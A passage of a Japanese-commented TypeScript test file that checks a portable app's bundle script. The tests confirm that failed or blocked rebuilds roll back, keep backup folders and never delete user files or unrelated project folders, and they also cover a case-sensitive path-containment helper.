    await mkdir(join(out, 'data'), { recursive: true });
    await writeFile(join(out, 'data', 'keep.txt'), '利用者の data');
    // 無い zip を渡すと、app を置き始めた後（Node を取り出すところ）で落ちる
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-broken', keepData: true, nodeZip: join(out, 'no-such.zip') }));
    assert.match(await readFile(join(out, 'VERSION'), 'utf8'), /test-good/, '前の版に戻っていない');
    assert.ok(existsSync(join(out, 'AdaptiveAIStudio.cmd')));
    assert.ok(existsSync(join(out, 'app', 'package.json')));
    assert.equal(await readFile(join(out, 'data', 'keep.txt'), 'utf8'), '利用者の data');
    assert.deepEqual((await readdir(out)).filter((n) => n.startsWith('.old-')), [], '退避フォルダが残っている');
  });

  test('**前の回に戻しきれず残した版（退避フォルダ）は、組めるまで消さない**', async () => {
    // 先に消していたので、「残してあります」と言った版を、もう一度押しただけで消していた
    const out = await tempDir('aas-rebundle-stuck-');
    const { mkdir, readdir } = await import('node:fs/promises');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-good' });
    await mkdir(join(out, '.old-999-1'), { recursive: true });
    await writeFile(join(out, '.old-999-1', 'VERSION'), '前の回に残した版');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-broken', nodeZip: join(out, 'no-such.zip') }));
    assert.equal(await readFile(join(out, '.old-999-1', 'VERSION'), 'utf8'), '前の回に残した版', '組めなかった回で、残した版を消した');
    await bundle({ out, srcRoot: installRoot(), version: 'test-good-again' });
    assert.deepEqual((await readdir(out)).filter((n) => n.startsWith('.old-')), [], '組めたのに退避フォルダが残っている');
  });

  test('**組み立て元の node_modules がリンクでも、写すのは中身で、組み立て元の型定義と .map を消さない**', async () => {
    const { mkdir, readdir, symlink, copyFile, stat } = await import('node:fs/promises');
    const { lstatSync } = await import('node:fs');
    const { bundle, PAYLOAD, launcherIn } = await import('../scripts/bundle.mjs');
    // 組み立て元: 製品の中身はフォルダごとリンクし（Windows では junction）、node_modules だけ作り物にする
    const src = await tempDir('aas-linked-src-');
    for (const item of PAYLOAD) {
      if (item === 'node_modules') continue;
      const from = join(installRoot(), item);
      const s = await stat(from).catch(() => undefined);
      if (!s) continue;
      if (s.isDirectory()) await symlink(from, join(src, item), 'junction');
      else await copyFile(from, join(src, item));
    }
    // 入口は、リポジトリでは launcher.cmd、bundle の中では一つ上の AdaptiveAIStudio.cmd にある。どちらで走らせても同じになるよう、
    // 見つけた方を launcher.cmd として置く
    await copyFile(launcherIn(installRoot()), join(src, 'launcher.cmd'));
    const modules = await tempDir('aas-linked-modules-');
    await mkdir(join(modules, 'pkg'), { recursive: true });
    await writeFile(join(modules, 'pkg', 'index.d.ts'), 'export {};');
    await writeFile(join(modules, 'pkg', 'index.js.map'), '{}');
    await writeFile(join(modules, 'pkg', 'index.js'), '');
    await symlink(modules, join(src, 'node_modules'), 'junction');
    const out = await tempDir('aas-linked-out-');
    await bundle({ out, srcRoot: src, version: 'test-linked' });
    assert.deepEqual((await readdir(join(modules, 'pkg'))).sort(), ['index.d.ts', 'index.js', 'index.js.map'], '組み立て元の中身を消した');
    assert.equal(lstatSync(join(out, 'app', 'node_modules')).isSymbolicLink(), false, '配る先にリンクを入れた');
    assert.ok(existsSync(join(out, 'app', 'node_modules', 'pkg', 'index.js')));
  });

  test('組んだものでないフォルダを出力先に渡されたら、組まずに止め、中身を消さない', async () => {
    // 中に入れてくれるつもりで既存のフォルダ（デスクトップなど）を渡すと、data 以外の中身がすべて消えていた
    const out = await tempDir('aas-rebundle-foreign-');
    await writeFile(join(out, 'notes.txt'), '利用者のメモ');
    const { bundle } = await import('../scripts/bundle.mjs');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-foreign', keepData: true }), /組んだものでない/);
    assert.equal(await readFile(join(out, 'notes.txt'), 'utf8'), '利用者のメモ', '利用者のファイルを消した');
  });

  test('前に組んだもの（見分けの元あり）なら、前の版の形で残った名前も片づける（対）', async () => {
    const out = await tempDir('aas-rebundle-old-');
    await writeFile(join(out, '.portable'), 'x');
    await writeFile(join(out, 'start-old.cmd'), '前の版の入口');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-old-layout' });
    assert.equal(existsSync(join(out, 'start-old.cmd')), false, '前の版の残りを片づけていない');
  });

  test('いま入れてある版が動いていて runtime を動かせないなら、何も消さずに止める', async () => {
    // Windows では読み込み中の node.exe が消せず、app を途中まで消したところで投げ、元の版にも戻れなかった
    const out = await tempDir('aas-rebundle-busy-');
    const { mkdir } = await import('node:fs/promises');
    await writeFile(join(out, '.portable'), 'x');
    await mkdir(join(out, 'app'), { recursive: true });
    await writeFile(join(out, 'app', 'kept.txt'), '動いている版');
    await mkdir(join(out, 'runtime'), { recursive: true });
    const busy = async () => { throw Object.assign(new Error('EBUSY: resource busy or locked'), { code: 'EBUSY' }); };
    const { bundle } = await import('../scripts/bundle.mjs');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-busy', renameImpl: busy }), /閉じてから/);
    assert.equal(await readFile(join(out, 'app', 'kept.txt'), 'utf8'), '動いている版', '止める前に消した');
    assert.ok(existsSync(join(out, '.portable')));
  });

  test('runtime 以外（app）が掴まれていても、先に移した分を戻して、何も消さずに止める', async () => {
    // runtime だけを確かめていたので、ほかが掴まれていると途中まで消えた。全部を退避へ移し、移せなければ戻す
    const { mkdir, readdir, rename } = await import('node:fs/promises');
    const out = await tempDir('aas-rebundle-partial-');
    await writeFile(join(out, '.portable'), 'x');
    await mkdir(join(out, 'app'), { recursive: true });
    await writeFile(join(out, 'app', 'kept.txt'), '動いている版');
    await mkdir(join(out, 'runtime'), { recursive: true });
    await writeFile(join(out, 'runtime', 'node.exe'), 'old');
    // runtime は動かせるが、app の中の読み込み中のもの（.node）で app が動かせない
    const lockedRuntime = async (from: string, to: string) => {
      if (/[\\/]app$/.test(from)) throw Object.assign(new Error('EBUSY'), { code: 'EBUSY' });
      return rename(from, to);
    };
    const { bundle } = await import('../scripts/bundle.mjs');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-partial', renameImpl: lockedRuntime }), /何も消していません/);
    assert.equal(await readFile(join(out, 'app', 'kept.txt'), 'utf8'), '動いている版', '移した分を戻していない');
    assert.ok(existsSync(join(out, '.portable')) && existsSync(join(out, 'runtime', 'node.exe')));
    assert.deepEqual((await readdir(out)).filter((n) => n.startsWith('.old-')), [], '退避フォルダが残っている');
  });

  test('**前の回に戻しきれず残した版（退避フォルダ）は、組めるまで消さない**', async () => {
    // 先に消していたので、「残してあります」と言った版を、もう一度押しただけで消していた
    const out = await tempDir('aas-rebundle-stuck-');
    const { mkdir, readdir } = await import('node:fs/promises');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-good' });
    await mkdir(join(out, '.old-999-1'), { recursive: true });
    await writeFile(join(out, '.old-999-1', 'VERSION'), '前の回に残した版');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-broken', nodeZip: join(out, 'no-such.zip') }));
    assert.equal(await readFile(join(out, '.old-999-1', 'VERSION'), 'utf8'), '前の回に残した版', '組めなかった回で、残した版を消した');
    await bundle({ out, srcRoot: installRoot(), version: 'test-good-again' });
    assert.deepEqual((await readdir(out)).filter((n) => n.startsWith('.old-')), [], '組めたのに退避フォルダが残っている');
  });

  test('改名が通るときは、古い runtime も退避フォルダも残さずに組み直す（対）', async () => {
    const { mkdir, readdir } = await import('node:fs/promises');
    const out = await tempDir('aas-rebundle-move-');
    await writeFile(join(out, '.portable'), 'x');
    await mkdir(join(out, 'runtime'), { recursive: true });
    await writeFile(join(out, 'runtime', 'stale-node.exe'), 'old');
    await mkdir(join(out, '.old-1-1'), { recursive: true }); // 前に途中で残った退避
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-move' });
    assert.equal(existsSync(join(out, 'runtime', 'stale-node.exe')), false, '古い runtime が残っている');
    assert.deepEqual((await readdir(out)).filter((n) => n.startsWith('.old-')), [], '退避フォルダが残っている');
    assert.ok(existsSync(join(out, 'AdaptiveAIStudio.cmd')));
  });

  test('VERSION と app を持つ別のプロジェクトを、前に組んだものと見なさない', async () => {
    const { mkdir } = await import('node:fs/promises');
    const out = await tempDir('aas-rebundle-rails-');
    await writeFile(join(out, 'VERSION'), '1.0.0');
    await mkdir(join(out, 'app'), { recursive: true });
    await writeFile(join(out, 'Gemfile'), 'source "x"');
    const { bundle } = await import('../scripts/bundle.mjs');
    await assert.rejects(bundle({ out, srcRoot: installRoot(), version: 'test-rails' }), /組んだものでない/);
    assert.ok(existsSync(join(out, 'Gemfile')));
  });

  test('desktop.ini・Thumbs.db だけのフォルダは、断らずに組む（対）', async () => {
    const out = await tempDir('aas-rebundle-ini-');
    await writeFile(join(out, 'desktop.ini'), '[.ShellClassInfo]');
    await writeFile(join(out, 'Thumbs.db'), 'x');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-ini' });
    assert.ok(existsSync(join(out, 'AdaptiveAIStudio.cmd')));
  });

  test('元が出力先の中にあれば組まずに止め、元を消さない', async () => {
    const out = await tempDir('aas-rebundle-inside-');
    const { mkdir } = await import('node:fs/promises');
    const src = join(out, '.setup', 'src');
    await mkdir(src, { recursive: true });
    await writeFile(join(src, 'marker.txt'), 'x');
    const { bundle } = await import('../scripts/bundle.mjs');
    await assert.rejects(bundle({ out, srcRoot: src, version: 'test-inside' }), /中にあります/);
    assert.ok(existsSync(join(src, 'marker.txt')), '止める前に元を消した');
  });
});

describe('いま居る場所がプログラムの中か', () => {
  test('Windows では、道の大文字と小文字を区別しない', () => {
    assert.equal(insideDir('c:\\program files\\adaptiveaistudio\\app', 'C:\\Program Files\\AdaptiveAIStudio', 'win32'), true);
    assert.equal(insideDir('C:\\Program Files\\AdaptiveAIStudio', 'c:\\program files\\adaptiveaistudio', 'win32'), true);
  });

  test('名前の頭が同じだけの隣は、中ではない', () => {
    assert.equal(insideDir('C:\\AAS2\\work', 'C:\\AAS', 'win32'), false);
    assert.equal(insideDir('/opt/aas2/work', '/opt/aas', 'linux'), false);
  });

  test('Windows 以外は、大文字と小文字を区別する', () => {
    assert.equal(insideDir('/opt/AAS/app', '/opt/aas', 'linux'), false);
    assert.equal(insideDir('/opt/aas/app', '/opt/aas', 'linux'), true);
  });
});
